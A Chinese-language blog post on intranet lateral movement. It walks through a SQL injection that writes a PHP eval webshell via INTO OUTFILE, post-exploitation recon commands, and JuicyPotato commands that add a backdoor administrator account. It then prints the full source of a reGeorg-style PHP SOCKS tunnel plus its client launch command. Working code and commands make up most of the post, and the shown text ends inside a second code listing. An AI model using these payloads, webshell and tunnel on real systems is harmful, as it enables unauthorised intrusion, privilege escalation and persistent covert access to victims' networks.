<!DOCTYPE html>

<html lang="cn">

<head>
    
    <title>内网-横向渗透 - RunCtf</title>
    <meta charset="UTF-8">
    <meta name="keywords" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    <link rel="shortcut icon" href="images/logo.png" type="image/png" />
    <meta name="description" content="1 利用SQL注入获取webshell核心命令： 1234567Mysql导出函数： [将数据库里面的内容导出]	into outfile	into dumpfile [可以写16进制写入]	当知道绝对路径时，且可以导出权限开启的时候就可以拿到Webshell。 DNS注入 load_file  利用sql注入生成一句话木马： 1id&#x3D;7 union select 1,&amp;#x27;&lt;?php">
<meta property="og:type" content="article">
<meta property="og:title" content="内网-横向渗透">
<meta property="og:url" content="http://runctf.cn/2022/10/26/neiwang/index.html">
<meta property="og:site_name" content="RunCtf">
<meta property="og:description" content="1 利用SQL注入获取webshell核心命令： 1234567Mysql导出函数： [将数据库里面的内容导出]	into outfile	into dumpfile [可以写16进制写入]	当知道绝对路径时，且可以导出权限开启的时候就可以拿到Webshell。 DNS注入 load_file  利用sql注入生成一句话木马： 1id&#x3D;7 union select 1,&amp;#x27;&lt;?php">
<meta property="og:locale">
<meta property="og:image" content="http://runctf.cn/images/neiwang/1.png">
<meta property="og:image" content="http://runctf.cn/images/neiwang/2.png">
<meta property="og:image" content="http://runctf.cn/images/neiwang/3.png">
<meta property="og:image" content="http://runctf.cn/images/neiwang/4.png">
<meta property="article:published_time" content="2022-10-26T14:16:01.000Z">
<meta property="article:modified_time" content="2023-01-11T16:35:33.800Z">
<meta property="article:author" content="JunHou">
<meta property="article:tag" content="技术">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://runctf.cn/images/neiwang/1.png">
    
<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1673454978753">
    
    <link rel="stylesheet" href="/css/style.css?v=1673454978753">

    
        
            <link rel="stylesheet" href="/custom.css?v=1673454978753">
        
    
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="mdui-drawer-body-left">
    <div id="nexmoe-background">
        <div class="nexmoe-bg" style="background-image: url(https://tenapi.cn/acg/?100)"></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="JunHou" class="mdui-btn mdui-btn-icon"><img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="JunHou">
            <img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou" alt="JunHou">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>Articles</span>13</div>
        <div><span>Tags</span>5</div>
        <div><span>Categories</span>0</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY/index.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/donate" title="给我赞助">
            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
            <div class="mdui-list-item-content">
                给我赞助
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about" title="关于博主">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博主
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
        
            <form id="search_form">
                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="Search" style="
                    font-size: 15px !important;
                    height: 56px !important;
                    background-image: none;
                "></label>
            </form>
         
    </div>
</div>


	<script async src="/js/search.js?v=1673454978753"></script>



    
        
        <div class="nexmoe-widget-wrap">
	<div class="nexmoe-widget nexmoe-social">
		<a
			class="mdui-ripple"
			href="https://jq.qq.com"
			target="_blank"
			mdui-tooltip="{content: 'QQ群'}"
			style="
				color: rgb(249, 174, 8);
				background-color: rgba(249, 174, 8, .1);
			"
		>
			<i
				class="nexmoefont icon-QQ"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://space.bilibili.com/289146211"
			target="_blank"
			mdui-tooltip="{content: '哔哩哔哩'}"
			style="
				color: rgb(231, 106, 141);
				background-color: rgba(231, 106, 141, .1);
			"
		>
			<i
				class="nexmoefont icon-bilibili"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://github.com/server2565543706"
			target="_blank"
			mdui-tooltip="{content: 'GitHub'}"
			style="
				color: rgb(25, 23, 23);
				background-color: rgba(25, 23, 23, .1);
			"
		>
			<i
				class="nexmoefont icon-github"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://www.zhihu.com/people/dcncloud"
			target="_blank"
			mdui-tooltip="{content: '知乎'}"
			style="
				color: rgb(30, 136, 229);
				background-color: rgba(30, 136, 229, .1);
			"
		>
			<i
				class="nexmoefont icon-zhihu"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://twitter.com/"
			target="_blank"
			mdui-tooltip="{content: 'Twitter'}"
			style="
				color: rgb(59, 151, 239);
				background-color: rgba(59, 151, 239, .1);
			"
		>
			<i
				class="nexmoefont icon-twitter"
			></i> </a
		><a
			class="mdui-ripple"
			href="https://nexmoe.com/"
			target="_blank"
			mdui-tooltip="{content: 'RSS'}"
			style="
				color: rgb(247, 132, 34);
				background-color: rgba(247, 132, 34, .1);
			"
		>
			<i
				class="nexmoefont icon-rss"
			></i> </a
		>
	</div>
</div>

    
        
        

    
        
        
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E6%8A%80%E6%9C%AF/" style="font-size: 20px;">技术</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%B8%B8%E6%88%8F/" style="font-size: 10px;">游戏</a>
    </div>
    
      <script>
        var maxTagcloud = parseInt(17);
        var tags_length = parseInt(5);
        var tags_arr = [];
        for(var i = 0; i < tags_length; i++){
          tags_arr.push(i);
        }
        tags_arr.sort(function (l, r) {
          return Math.random() > 0.5 ? -1 : 1;
        });
        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
        }
      </script>
    
  </div>

    
        
        <!-- 一言 -->
<div class="nexmoe-widget-wrap">
  <h3 class="nexmoe-widget-title">
    Hitokoto
  </h3>
  <div class="nexmoe-widget">
    <ul class="hitokoto-box">
      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
        <a href="#" id="hitokoto_text">
          
        </a>
        <a href="#" id="hitokoto_error_text" style="display: none;">
          
        </a>
      </li>
    </ul>
  </div>
</div>

<script>
  let hitokotoText = document.getElementById('hitokoto_text')
  let hitokotoErroText = document.getElementById('hitokoto_error_text')
  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
  window.onload = function () {
    let url = 'https://v1.hitokoto.cn'
    if (hitokotoCategory) {
      url += '?c=' + hitokotoCategory
    }
    fetch(url)
      .then(response => response.json())
      .then(data => {
        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
      })
      .catch((reason) => {
        console.error(11, reason)
        hitokotoText.style.display = 'none'
        hitokotoErroText.style.display = 'block'
      })
  }
</script>
    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Archive</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">13</span></li></ul>
    </div>
  </div>



    
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Recent Posts</h3>
    <div class="nexmoe-widget">
      <ul>
        
          <li>
            <a href="/2022/12/23/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/">山东省&#34;技能兴鲁-网络安全赛道&#34;职业技能大赛WriteUp</a>
          </li>
        
          <li>
            <a href="/2022/12/15/%E5%8E%9F%E7%A5%9E%E6%9C%8D%E5%8A%A1%E5%8C%BA%E8%BD%AC%E6%8D%A2/">原神换服</a>
          </li>
        
          <li>
            <a href="/2022/12/11/CTFd/">部署CTFd</a>
          </li>
        
          <li>
            <a href="/2022/12/11/w1r3s-editable/">w1r3s-editable解题笔记</a>
          </li>
        
          <li>
            <a href="/2022/12/10/%E7%AC%94%E8%AE%B0/">Pwn的学习笔记</a>
          </li>
        
      </ul>
    </div>
  </div>

    
        
        <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-link">
		<ul>
        
		</ul>
    </div>
</div>
<style>
.nexmoe-widget-wrap .nexmoe-link ul li a {
    text-align : center;
}
.nexmoe-widget-wrap .nexmoe-link ul li a img {
    max-width : 100%;
}
.nexmoe-widget-wrap .nexmoe-link ul li a p {
    margin: 10px 0;
}
</style>

    
</aside>
    <div class="nexmoe-copyright">
        &copy; 2023 JunHou
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        <br><a target="_blank" href="https://beian.miit.gov.cn/">	鲁ICP备2022032031-1号</a>
        <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
    </div>
</div><!-- .nexmoe-drawer -->

    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
            <div class="nexmoe-post">

  <article>
    
        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
            <img src="https://tenapi.cn/acg/?7" alt="内网-横向渗透" loading="lazy">
            <h1>内网-横向渗透</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2022年10月26日</a>
        
        
    </div>
    
    
    
    
    
</div>

    <p>1</p>
<h2 id="利用SQL注入获取webshell"><a href="#利用SQL注入获取webshell" class="headerlink" title="利用SQL注入获取webshell"></a>利用SQL注入获取webshell</h2><p>核心命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Mysql导出函数： [将数据库里面的内容导出]</span><br><span class="line">	into outfile</span><br><span class="line">	into dumpfile [可以写16进制写入]</span><br><span class="line"></span><br><span class="line">	当知道绝对路径时，且可以导出权限开启的时候就可以拿到Webshell。 DNS注入 load_file</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用sql注入生成一句话木马：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=7 union select 1,&#x27;&lt;?php eval($_REQUEST[8])?&gt;&#x27; into outfile &#x27;c:/phpstudy/www/125.php&#x27;</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/neiwang/1.png" alt="1" data-caption="1" loading="lazy"></p>
<h2 id="上传成功利用webshell管理工具进行遍历"><a href="#上传成功利用webshell管理工具进行遍历" class="headerlink" title="上传成功利用webshell管理工具进行遍历"></a>上传成功利用webshell管理工具进行遍历</h2><p>查看管理权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami 查看当前用户权限</span><br><span class="line">netstat -ano   查看本机开放的端口		</span><br><span class="line">tasklist 查看本机运行的程序[类似于任务管理器]</span><br><span class="line">systeminfo 查看计算机信息</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/neiwang/2.png" alt="2" data-caption="2" loading="lazy"></p>
<p>windows漏洞查看(<a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a>).</p>
<p>使用webshell管理工具上传exp.</p>
<p>权限是test权限使用exp进行提权,使用exp(JuicyPotato.exe).</p>
<p>使用方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -p &quot;需要执行的命令&quot;</span><br><span class="line">添加账号:</span><br><span class="line">JuicyPotato.exe -p &quot;net user qqq 123 /add&quot;</span><br><span class="line">提升至管理员组:</span><br><span class="line">JuicyPotato.exe -p &quot;net localgroup administrators qqq /add&quot;</span><br></pre></td></tr></table></figure>

<p>使用远程桌面进行连接发现不是一台服务器，对方使用了端口映射.</p>
<p>我们使用代理脚本(xxx.php)使用webshell管理工具进行上传:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*二开作者qq2565543706*/</span><br><span class="line">ini_set(&quot;allow_url_fopen&quot;, true);</span><br><span class="line">ini_set(&quot;allow_url_include&quot;, true);</span><br><span class="line">error_reporting(E_ERROR | E_PARSE);</span><br><span class="line"></span><br><span class="line">if( !function_exists(&#x27;apache_request_headers&#x27;) ) &#123;</span><br><span class="line">    function apache_request_headers() &#123;</span><br><span class="line">        $arh = array();</span><br><span class="line">        $rx_http = &#x27;/\AHTTP_/&#x27;;</span><br><span class="line"></span><br><span class="line">        foreach($_SERVER as $key =&gt; $val) &#123;</span><br><span class="line">            if( preg_match($rx_http, $key) ) &#123;</span><br><span class="line">                $arh_key = preg_replace($rx_http, &#x27;&#x27;, $key);</span><br><span class="line">                $rx_matches = array();</span><br><span class="line">                $rx_matches = explode(&#x27;_&#x27;, $arh_key);</span><br><span class="line">                if( count($rx_matches) &gt; 0 and strlen($arh_key) &gt; 2 ) &#123;</span><br><span class="line">                    foreach($rx_matches as $ak_key =&gt; $ak_val) &#123;</span><br><span class="line">                        $rx_matches[$ak_key] = ucfirst($ak_val);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    $arh_key = implode(&#x27;-&#x27;, $rx_matches);</span><br><span class="line">                &#125;</span><br><span class="line">                $arh[$arh_key] = $val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return( $arh );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;GET&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    exit(&quot;Georg says, &#x27;All seems fine&#x27;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">	set_time_limit(0);</span><br><span class="line">	$headers=apache_request_headers();</span><br><span class="line">	$cmd = $headers[&quot;X-CMD&quot;];</span><br><span class="line">    switch($cmd)&#123;</span><br><span class="line">		case &quot;CONNECT&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">				$target = $headers[&quot;X-TARGET&quot;];</span><br><span class="line">				$port = (int)$headers[&quot;X-PORT&quot;];</span><br><span class="line">				#$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">				#if ($sock === false)</span><br><span class="line">				#&#123;</span><br><span class="line">				#	header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">				#	header(&#x27;X-ERROR: Failed creating socket&#x27;);</span><br><span class="line">				#	return;</span><br><span class="line">				#&#125;</span><br><span class="line">        $res = fsockopen($target, $port);</span><br><span class="line">				#$res = @socket_connect($sock, $target, $port);</span><br><span class="line">                if ($res === false)</span><br><span class="line">				&#123;</span><br><span class="line">					header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">					header(&#x27;X-ERROR: Failed connecting to target&#x27;);</span><br><span class="line">					return;</span><br><span class="line">				&#125;</span><br><span class="line">				#socket_set_nonblock($res);</span><br><span class="line"></span><br><span class="line">        stream_set_blocking($res, false);</span><br><span class="line">				@session_start();</span><br><span class="line">				$_SESSION[&quot;run&quot;] = true;</span><br><span class="line">                $_SESSION[&quot;writebuf&quot;] = &quot;&quot;;</span><br><span class="line">                $_SESSION[&quot;readbuf&quot;] = &quot;&quot;;</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                header(&#x27;X-STATUS: OK&#x27;);</span><br><span class="line">                header(&quot;Connection: close&quot;);</span><br><span class="line">                ignore_user_abort();</span><br><span class="line">                ob_start();</span><br><span class="line">                $size = ob_get_length();</span><br><span class="line">                header(&quot;Content-Length: $size&quot;);</span><br><span class="line">                ob_end_flush();</span><br><span class="line">                flush();</span><br><span class="line">				session_write_close();</span><br><span class="line"></span><br><span class="line">				while ($_SESSION[&quot;run&quot;])</span><br><span class="line">				&#123;</span><br><span class="line">					$readBuff = &quot;&quot;;</span><br><span class="line">					@session_start();</span><br><span class="line">					$writeBuff = $_SESSION[&quot;writebuf&quot;];</span><br><span class="line">					$_SESSION[&quot;writebuf&quot;] = &quot;&quot;;</span><br><span class="line">					session_write_close();</span><br><span class="line">                    if ($writeBuff != &quot;&quot;)</span><br><span class="line">					&#123;</span><br><span class="line">            stream_set_blocking($res, false);</span><br><span class="line">						$i = fwrite($res, $writeBuff); #socket_write($sock, $writeBuff, strlen($writeBuff));</span><br><span class="line">						if($i === false)</span><br><span class="line">						&#123;</span><br><span class="line">							@session_start();</span><br><span class="line">                            $_SESSION[&quot;run&quot;] = false;</span><br><span class="line">                            session_write_close();</span><br><span class="line">                            header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">							header(&#x27;X-ERROR: Failed writing socket&#x27;);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">          # stream_set_timeout($res, 1);</span><br><span class="line">          stream_set_blocking($res, false);</span><br><span class="line">          while ($o = fgets($res, 10)) &#123;</span><br><span class="line">					if($o === false)</span><br><span class="line">						&#123;</span><br><span class="line">                            @session_start();</span><br><span class="line">                            $_SESSION[&quot;run&quot;] = false;</span><br><span class="line">                            session_write_close();</span><br><span class="line">							header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">							header(&#x27;X-ERROR: Failed reading from socket&#x27;);</span><br><span class="line">						&#125;</span><br><span class="line">						$readBuff .= $o;</span><br><span class="line">					&#125;</span><br><span class="line">                    if ($readBuff!=&quot;&quot;)&#123;</span><br><span class="line">                        @session_start();</span><br><span class="line">                        $_SESSION[&quot;readbuf&quot;] .= $readBuff;</span><br><span class="line">                        session_write_close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    #sleep(0.2);</span><br><span class="line">				&#125;</span><br><span class="line">                fclose($res);</span><br><span class="line">			&#125;</span><br><span class="line">			break;</span><br><span class="line">		case &quot;DISCONNECT&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">                error_log(&quot;DISCONNECT recieved&quot;);</span><br><span class="line">				@session_start();</span><br><span class="line">				$_SESSION[&quot;run&quot;] = false;</span><br><span class="line">				session_write_close();</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			break;</span><br><span class="line">		case &quot;READ&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">				@session_start();</span><br><span class="line">				$readBuffer = $_SESSION[&quot;readbuf&quot;];</span><br><span class="line">                $_SESSION[&quot;readbuf&quot;]=&quot;&quot;;</span><br><span class="line">                $running = $_SESSION[&quot;run&quot;];</span><br><span class="line">				session_write_close();</span><br><span class="line">                if ($running) &#123;</span><br><span class="line">					header(&#x27;X-STATUS: OK&#x27;);</span><br><span class="line">                    header(&quot;Connection: Keep-Alive&quot;);</span><br><span class="line">					echo $readBuffer;</span><br><span class="line">					return;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">                    header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">                    header(&#x27;X-ERROR: RemoteSocket read filed&#x27;);</span><br><span class="line">					return;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			break;</span><br><span class="line">		case &quot;FORWARD&quot;:</span><br><span class="line">			&#123;</span><br><span class="line">                @session_start();</span><br><span class="line">                $running = $_SESSION[&quot;run&quot;];</span><br><span class="line">				session_write_close();</span><br><span class="line">                if(!$running)&#123;</span><br><span class="line">                    header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">					header(&#x27;X-ERROR: No more running, close now&#x27;);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                header(&#x27;Content-Type: application/octet-stream&#x27;);</span><br><span class="line">				$rawPostData = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">				if ($rawPostData) &#123;</span><br><span class="line">					@session_start();</span><br><span class="line">					$_SESSION[&quot;writebuf&quot;] .= $rawPostData;</span><br><span class="line">					session_write_close();</span><br><span class="line">					header(&#x27;X-STATUS: OK&#x27;);</span><br><span class="line">                    header(&quot;Connection: Keep-Alive&quot;);</span><br><span class="line">					return;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					header(&#x27;X-STATUS: FAIL&#x27;);</span><br><span class="line">					header(&#x27;X-ERROR: POST request read filed&#x27;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如图所示启用成功:</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/neiwang/3.png" alt="3" data-caption="3" loading="lazy"></p>
<p>使用全局代理工具(Proxifier)进行代理:</p>
<p>1,起用python监听脚本(使用python2.7版本):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://&#123;xxx.php&#125;地址 -p 本地监听端口</span><br></pre></td></tr></table></figure>

<p>源码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 